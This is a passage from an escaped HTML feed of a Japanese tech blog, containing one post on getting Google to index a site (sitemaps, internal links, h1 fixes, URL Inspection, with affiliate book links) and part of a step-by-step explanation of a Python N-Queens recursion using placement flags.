&lt;span class="p">[{&lt;/span>
&lt;span class="s2">&amp;#34;@context&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;https://schema.org&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;@type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;BlogPosting&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headline&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;Googleにインデックスされないときの対応方法は？&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mainEntityOfPage&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;@type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;WebPage&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;@id&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;[$URL]&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;datePublished&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;dateModified&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;publisher&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;@type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Organization&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;NLP - 最新技術やプログラム、デザインなど様々な情報を提供するサイト&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;logo&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;@type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;ImageObject&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;url&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;[$URL]/images/logo.png&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;author&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;@type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Person&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;nlp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;url&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;[$URL]/authors/wyoshi/&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">},{&lt;/span>
&lt;span class="s2">&amp;#34;@context&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;https://schema.org&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;@type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;BreadcrumbList&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;itemListElement&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[{&lt;/span>
&lt;span class="s2">&amp;#34;@type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;ListItem&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;position&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;NLP - 最新技術やプログラム、デザインなど様々な情報を提供するサイト&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;item&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s2">&amp;#34;[$URL]&amp;#34;&lt;/span>
&lt;span class="p">}]&lt;/span>
&lt;span class="p">}]&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 154;
flex-basis: 369px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img07.png" data-size="980x636">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img07.png"
width="980"
height="636"
loading="lazy"
alt="Googleにインデックスされないときの対応方法は？の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h3 id="サイトマップを消す">サイトマップを消す&lt;/h3>
&lt;p>サイトマップ自体へのアクセスが頻繁に行われていないので、サイトマップを消してみました。&lt;br>
クロールされないかと思いましたが、Bingで新しい記事をクロールして取得されてました。&lt;br>
しかし、記事のタイトルを変えてもなかなか変わらないのでやはりサイトマップは必要かもしれません。&lt;/p>
&lt;h3 id="タイトルを変える">タイトルを変える&lt;/h3>
&lt;p>タイトルを変えて、ページに更新をかけてみましたが、クロールされませんでした。&lt;br>
Bingも同様にタイトルを変えただけではクロールされないようでした。&lt;/p>
&lt;h3 id="サイトマップのhtmlを作成する">サイトマップのHTMLを作成する&lt;/h3>
&lt;p>クローラーがクロールしやすいように&lt;a class="link" href="https://suzukiiichiro.github.io/sitemap/" >サイトマップのHTML&lt;/a>を作成しました。&lt;br>
これによって、クローラーが内部リンクを通じて各ページにアクセスできるかなと思いますが、まだ効果の程はわかりません。&lt;/p>
&lt;h3 id="ランキングを作成する">ランキングを作成する&lt;/h3>
&lt;p>&lt;a class="link" href="https://suzukiiichiro.github.io/ranking/" >ランキングページ&lt;/a>の作成も上記の「サイトマップのHTMLを作成する」のようにクローラビリティを上げるためになります。&lt;br>
あとは、自分たちでもどんな記事を読まれているのかといった指標をすぐ閲覧できるからです。&lt;/p>
&lt;h3 id="seo対策">SEO対策&lt;/h3>
&lt;h4 id="画像のサイズの最適化">画像のサイズの最適化&lt;/h4>
&lt;p>画像のサイズが最適化できていなかったので、画像のサイズの最適化を行いました。&lt;br>
これによってSEOのスコアを上げることができました。サイトの速度もインデックスされるためには重要な指標になってくるので、きれいな画像を使用したいときは各デバイスに最適化された画像を用意して、サイトの速度を落とさないようにしましょう。&lt;/p>
&lt;h4 id="asideのdiv化">asideのdiv化&lt;/h4>
&lt;p>ページに直接関係ない部分をasideタグで書いていたのですが、内部リンクをたどってないのではないかと考えて、asideをdivに変更しました。&lt;br>
これによって、効果があるかはわかりませんが……。&lt;/p>
&lt;h4 id="内部リンクを増やす">内部リンクを増やす&lt;/h4>
&lt;p>カテゴリーだけでなく、著者のページなどを作成して内部リンクするようにしました。&lt;br>
これは若干の効果があって、サイトマップ&lt;/p>
&lt;h4 id="h1タグの正規化">h1タグの正規化&lt;/h4>
&lt;p>以前はロゴに当たる部分が h1 となっていたので、各ページでタイトルになる部分に h1 が当たるように変更しました。&lt;br>
ロゴに h1 を当てる人が多いかと思いますが、各ページのタイトル部分に当てたほうが、ページのタイトルとh1との整合性が取れます。&lt;/p>
&lt;p>また、h1は1ページに1つとされていますが、あくまで原則で、何個出てきても大丈夫です。ただし、たくさん使うのはNGになるので注意してください。&lt;/p>
&lt;h4 id="パンくずを追加">パンくずを追加&lt;/h4>
&lt;p>孤立ページを出さないように、そして、ページごとの回遊率を上げるためにパンくずを設置しました。&lt;br>
パンくずはクローラーにとっても内部リンクをたどっていけるようになるのではないかと考えております。&lt;/p>
&lt;h2 id="url検査を行う">URL検査を行う&lt;/h2>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 165;
flex-basis: 397px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img06.jpg" data-size="980x591">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img06.jpg"
width="980"
height="591"
loading="lazy"
alt="Googleにインデックスされないときの対応方法は？の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;br>
クローラーが活動をしていないので、サイトマップへ自動的にアクセスして追加してくれるという望みを諦めて、「URL検査」を使って、手動でクローラーを呼び寄せます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 104;
flex-basis: 251px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img03.png" data-size="980x936">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img03.png"
width="980"
height="936"
loading="lazy"
alt="Googleにインデックスされないときの対応方法は？の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>これによって、以前は除外が22件あったものが2月1日では4件まで減りました。&lt;/p>
&lt;p>そして、新しく作成したページも2件ほどGoogle検索に出るようになり、すでにインデックスされていたページは変更が検知され、タイトルの表記が変わりました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 154;
flex-basis: 370px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img08.png" data-size="980x635">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/img08.png"
width="980"
height="635"
loading="lazy"
alt="Googleにインデックスされないときの対応方法は？の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;strong>URL検査は非常に効果的&lt;/strong>です。&lt;/p>
&lt;p>しかし、記事ページへのアクセスはまだないので、これは再度原因を探る必要があります。&lt;br>
変更されたのは以前サイトマップに登録されていたページなので、クローラーがサイトマップでインデックスしたものを優先している可能性がありそうです。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>Googleにインデックスされない問題はかなり多いようです。&lt;br>
Bingでの流入やSNSでの流入はもちろん大事ですが、Googleで検索している人が多い以上対応する必要があります。&lt;br>
まずは記事の品質を上げて、SEO対策し、そして「URL検査」を行う。そうして、Googleクローラーが来てインデックスされるのを待つほかいまのところありません。&lt;/p>
&lt;p>また何か動きがあれば掲載してきたいと思います。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e6%b2%88%e9%bb%99%e3%81%aeWeb%e3%83%9e%e3%83%bc%e3%82%b1%e3%83%86%e3%82%a3%e3%83%b3%e3%82%b0-%e2%94%80Web%e3%83%9e%e3%83%bc%e3%82%b1%e3%83%83%e3%82%bf%e3%83%bc-%e3%83%9c%e3%83%bc%e3%83%b3%e3%81%ae%e9%80%86%e8%a5%b2%e2%94%80-%e3%82%a2%e3%83%83%e3%83%97%e3%83%87%e3%83%bc%e3%83%88%e3%83%bb%e3%82%a8%e3%83%87%e3%82%a3%e3%82%b7%e3%83%a7%e3%83%b3-%e6%9d%be%e5%b0%be-ebook/dp/B08J7GGY6N/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51VoHDbz3qL.jpg" alt=" 沈黙のWebマーケティング ─Webマーケッター ボーンの逆襲─ アップデート・エディション ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 沈黙のWebマーケティング ─Webマーケッター ボーンの逆襲─ アップデート・エディション &lt;/h2>
&lt;p> この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【Web集客で悩むすべての人へ！ 成果を上げる「極意」を伝える。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%81%84%e3%81%a1%e3%81%b0%e3%82%93%e3%82%84%e3%81%95%e3%81%97%e3%81%84%e6%96%b0%e3%81%97%e3%81%84SEO%e3%81%ae%e6%95%99%e6%9c%ac-%e7%ac%ac2%e7%89%88-%e4%ba%ba%e6%b0%97%e8%ac%9b%e5%b8%ab%e3%81%8c%e6%95%99%e3%81%88%e3%82%8b%e6%a4%9c%e7%b4%a2%e3%81%ab%e5%bc%b7%e3%81%84%e3%82%b5%e3%82%a4%e3%83%88%e3%81%ae%e4%bd%9c%e3%82%8a%e6%96%b9-MFI%e5%af%be%e5%bf%9c-%e3%80%8c%e3%81%84%e3%81%a1%e3%81%b0%e3%82%93%e3%82%84%e3%81%95%e3%81%97%e3%81%84%e6%95%99%e6%9c%ac%e3%80%8d%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba/dp/4295004081/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/519qHZi-znL.jpg" alt=" いちばんやさしい新しいSEOの教本 第2版 人気講師が教える検索に強いサイトの作り方[MFI対応] (「いちばんやさしい教本」シリーズ) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> いちばんやさしい新しいSEOの教本 第2版 人気講師が教える検索に強いサイトの作り方[MFI対応] (「いちばんやさしい教本」シリーズ) &lt;/h2>
&lt;p> SEO入門の定番書を最新環境に合わせてリニューアル! 「今まで何冊もSEOの本を読みましたが、正統派のSEOの思想が理解出来る一番良質な内容でした」 「セミナー形式で書かれているので、自社サイトに当てはめて作業することができました」 「こんなに洗いざらいノウハウを体系だてて載せていいのか! ?と心配するくらい満足のいく内容でした。」 「何か困った時にバイブル的に活用できる1冊です。」 (以上、前書のAmazonカスタマーレビューより抜粋) SEO(検索エンジン最適化)とは、 「検索結果の上位にサイトを表示すること」ではありません。 「訪問者の目的に応えるサイトを作ること」です。 そのために、対策すべきキーワードを選定し、 サイトの構造を整えることが大切なのです。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>第4回 pythonでNQueen（エイトクイーン）配置フラグ（制約テスト高速化）（２）</title><link>https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/</link><pubDate>Fri, 04 Feb 2022 09:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/chess.jpg" alt="Featured image of post 第4回 pythonでNQueen（エイトクイーン）配置フラグ（制約テスト高速化）（２）" />&lt;h2 id="配置フラグ制約テスト高速化">配置フラグ（制約テスト高速化）&lt;/h2>
&lt;p>今回も引き続き配置フラグ（制約テスト高速化）を説明していきたいと思います。 &lt;br>
前回はプログラムの概要を説明しましたが、今回はnqueenメソッドの再帰と配置フラグの動きについて図で示しながら説明していきたいとおもいます。&lt;/p>
&lt;p>プログラムソースは以下のURLにあります。&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py02_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py02_nqueen.py&lt;/a>&lt;/p>
&lt;p>プログラムはエイトクイーン(N=8)ですが説明をしやすくするため4x4のN=4で説明します。実際に動かしてプログラムの動作を確認したい方は419,420行目のMAXとSIZEを4に変更してみてください。&lt;/p>
&lt;h2 id="おさらい">おさらい&lt;/h2>
&lt;p>ブルートフォースからのおさらいとして次の点を押さえておきましょう。&lt;br>
・442行目のABOARD[row]=i はクイーンを配置する動きです。&lt;br>
・445行目のnqueen(row+1)は再帰でnqueenメソッドを動かしていますがこれは次の行に進む動きです。&lt;br>
・438,439は最終行(4行目)までクイーンを置ききった後にCOUNT と各行にクイーンを置いた場所を出力します。&lt;br>
再帰でnqueenメソッドを呼び出したときは、当然のことなのですがメソッドの先頭435行目に移動します。&lt;br>
引数で渡されたrow以外のローカル変数はすべて初期化された状態になります。&lt;/p>
&lt;p>・再帰から抜ける部分は2箇所あります。&lt;br>
一つ目は、438,439行目で最終行(4行目)までクイーンを置ききった後にprintoutする時&lt;/p>
&lt;p>二つ目は、441行目のfor文がSIZE数の数(N=4だと3)だけ回りきったあとです。&lt;/p>
&lt;p>再帰から抜けたときは再帰を呼び出した445行目のすぐ後ろからスタートします。&lt;br>
ローカル変数の状態は再帰を呼び出す直前の状態になります。&lt;br>
1行前に戻るような動きとなります。&lt;/p>
&lt;p>ちなみに441行目のfor i in range(SIZE)は右端から左端に1個ずつクイーンを置こうとする動きです。&lt;br>
左端までクイーンを置ききったらfor文を抜けるイメージです。&lt;/p>
&lt;h2 id="nqueen-メソッドの動き">nqueen メソッドの動き&lt;/h2>
&lt;p>448行目のnqueen(0)からスタートします。&lt;br>
メソッドの先頭435行目に移動します。&lt;br>
row=0なので440行目の else: に移動します。&lt;br>
441行目のfor文に入りi=0からスタートします。&lt;br>
442行目のABOARD[0]=0で1行目の右端にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 235px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q1.png" data-size="324x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q1.png"
width="324"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
1個目のクイーンなので当然配置フラグはどれもOの状態ですから443行目のif FA[0] == 0 の条件を満たしてif文の中に入ります。&lt;br>
右端にクイーンを置いたのですから444行目でFA[0]=1 で右端の位置にフラグをたてます。&lt;br>
445行目でnqueenを引数1を渡して呼び出して2行目に進みます。&lt;/p>
&lt;p>再帰呼び出しなのでrow=1の状態でメソッドの先頭435行目に移動します。&lt;br>
row=1なので440行目の else: に移動します。&lt;br>
441行目のfor文に入りi=0からスタートします。&lt;br>
442行目のABOARD[1]=0で2行目の右端にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q2.png" data-size="322x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q2.png"
width="322"
height="324"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
1行目で既に右端にクイーンを設置していますのでFA[0]は1になりますので443行目のif FA[i]==0の条件を満たしません。&lt;br>
if文に入らずに次のfor文に進みます。&lt;/p>
&lt;p>この部分が今回追加された配置フラグの制御になります。&lt;br>
この処理のおかげで上下の利き筋に引っかかる場合は次の行に移動するのをやめ探索を効率化することができます。&lt;/p>
&lt;p>441行目で次のfor文に進みi=1となります。&lt;/p>
&lt;p>442行目のABOARD[1]=1で2行目の右から2列目にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q3.png" data-size="324x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q3.png"
width="324"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>1行目で右端にクイーンを置いているのでFAの状態は以下のとおりです。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]==1
FA[1]==0
FA[2]==0
FA[3]==0
&lt;/code>&lt;/pre>&lt;p>FA[1]は0なのでif FA[i]==0の条件を満たすのでif 文の中に入ります。&lt;/p>
&lt;p>右端から2列目にクイーンを置いたのですから444行目でFA[1]=1 で右端から2番目の位置にフラグをたてます。&lt;br>
445行目でnqueenを引数2を渡して呼び出して3行目に進みます。&lt;/p>
&lt;p>再帰呼び出しなのでrow=2の状態でメソッドの先頭435行目に移動します。&lt;br>
row=2なので440行目の else: に移動します。&lt;br>
441行目のfor文に入りi=0からスタートします。&lt;br>
442行目のABOARD[2]=0で3行目の右端にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q4.png" data-size="324x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q4.png"
width="324"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>1行目で右端に、2行目で右から2列目にクイーンを置いているのでFAの状態は以下のとおりです。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]==1
FA[1]==1
FA[2]==0
FA[3]==0
&lt;/code>&lt;/pre>&lt;p>i=0 FA[0]=1なのでif FA[i]==0の条件を満たさずに次のfor文に進みます。&lt;/p>
&lt;p>441行目で次のfor文に進みi=1となります。&lt;br>
442行目のABOARD[2]=1で3行目の右から2列目にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 244px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q5.png" data-size="330x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q5.png"
width="330"
height="324"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>1行目で右端に、2行目で右から2列目にクイーンを置いているのでFAの状態は以下のとおりです。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]==1
FA[1]==1
FA[2]==0
FA[3]==0
&lt;/code>&lt;/pre>&lt;p>i=1 FA[1]=1なのでif FA[i]==0の条件を満たさずに次のfor文に進みます。&lt;/p>
&lt;p>441行目で次のfor文に進みi=2となります。&lt;br>
442行目のABOARD[2]=2で3行目の右から3列目にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q6.png" data-size="328x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q6.png"
width="328"
height="326"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]==1
FA[1]==1
FA[2]==0
FA[3]==0
&lt;/code>&lt;/pre>&lt;p>i=2 FA[2]=0なのでif FA[i]==0の条件を満たすのでif文の中に入ります。&lt;br>
右端から3列目にクイーンを置いたのですから444行目でFA[2]=1 で右から3列目の位置にフラグをたてます。&lt;br>
445行目でnqueenを引数3を渡して呼び出して4行目に進みます。&lt;/p>
&lt;p>再帰呼び出しなのでrow=3の状態でメソッドの先頭435行目に移動します。&lt;br>
row=3なので440行目の else: に移動します。&lt;br>
441行目のfor文に入りi=0からスタートします。&lt;br>
for文の中で右端から左端へ順番にクイーンを置いていくことになりますが。&lt;br>
すでに、1行目で右端、2行目で右から2列目、3行目で右から3列目にクイーンを設置しています。&lt;br>
FAの状態を見てみると以下の通りです。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]==1
FA[1]==1
FA[2]==1
FA[3]==0
&lt;/code>&lt;/pre>&lt;p>そのためiが0,1,2の時は443行目の配置フラグの制約に引っかかりif文の中には入らず次のfor文に進みます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 102;
flex-basis: 246px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q7.png" data-size="324x316">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q7.png"
width="324"
height="316"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 242px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q8.png" data-size="328x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q8.png"
width="328"
height="324"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 104;
flex-basis: 250px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q9.png" data-size="332x318">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q9.png"
width="332"
height="318"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>i=3では&lt;br>
ABOARD[3]=3で4行目の左端にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 235px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q10.png" data-size="324x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q10.png"
width="324"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
やっとフラグの制約に引っかからず443行のif文の中にはいれます。&lt;/p>
&lt;p>FA[3]=1&lt;br>
444行目でFA[3]=1 で右から4番目の位置にフラグをたてます。&lt;br>
445行目でnqueenを引数4を渡して呼び出して先に進みます。&lt;/p>
&lt;p>再帰呼び出しなのでrow=4の状態でメソッドの先頭435行目に移動します。&lt;br>
row=4なので438行目の if row == SIZE:の条件を満たします。&lt;br>
439でprintout()メソッドを呼び出してCOUNT と各行のクイーンの設置場所を出力します。&lt;/p>
&lt;p>そして、再帰を抜け4行目の処理（row=3）に戻ります。&lt;br>
戻る場所は445行目のすぐ下です。&lt;br>
ローカル変数は再帰を呼び出す直前の状態にもどっています。&lt;br>
row=3 i=3です。&lt;br>
446行目でFA[3]=0 でフラグを落としています。&lt;br>
グローバル変数は再帰からもどっても再帰を呼び出す直前の状態に自動的にはもどらないので明示的にフラグを落とす必要があります。&lt;/p>
&lt;p>446行目でフラグを落としたあと次のfor文に進むのですが、すでにi=3なのでfor文を抜けます。&lt;br>
for文を抜けると再帰を抜け3行目の処理(row=2)に戻ります。&lt;br>
ここではrow=4,row=3と立て続けに再帰をぬけrow=2に戻る形となります。&lt;/p>
&lt;p>戻る場所は445行目のすぐ下です。&lt;br>
ローカル変数は再帰を呼び出す直前の状態にもどっています。&lt;br>
3行目はforは0,1,2まで進んでいました。&lt;br>
row=2 i=2です。&lt;br>
446行目でFA[2]=0 でフラグを落としています。&lt;br>
そして次のfor文に進みます。&lt;br>
i=3で&lt;br>
ABOARD[2]=3で3行目の左端にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 97;
flex-basis: 234px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q11.png" data-size="324x332">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q11.png"
width="324"
height="332"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
FAの状態を見てみると以下の通りです。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]==1
FA[1]==1
FA[2]==0
FA[3]==0
&lt;/code>&lt;/pre>&lt;p>FA[3]=0なのでif FA[i]==0:の条件を満たしてif 文の中に入ります。&lt;br>
右から4列目にクイーンを置いているので444行目でFA[3]=1 でフラグをたてます。&lt;br>
445行目でnqueenを引数3を渡して呼び出して先に進みます。&lt;/p>
&lt;p>再帰呼び出しなのでrow=3の状態でメソッドの先頭435行目に移動します。&lt;br>
row=3なので440行目の else: に移動します。&lt;br>
441行目のfor文に入りi=0からスタートします。&lt;br>
for文の中で右端から左端へ順番にクイーンを置いていくことになりますが。&lt;br>
すでに、1行目で右端、2行目で右から2番目、3行目で右から4番目にクイーンを設置しています。&lt;br>
FAの状態を見てみると以下の通りです。&lt;/p>
&lt;pre tabindex="0">&lt;code>FA[0]==1
FA[1]==1
FA[2]==0
FA[3]==1
&lt;/code>&lt;/pre>&lt;p>そのためiが0,1の時は443行目の配置フラグの制約に引っかかりif文の中には入らず次のfor文に進みます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
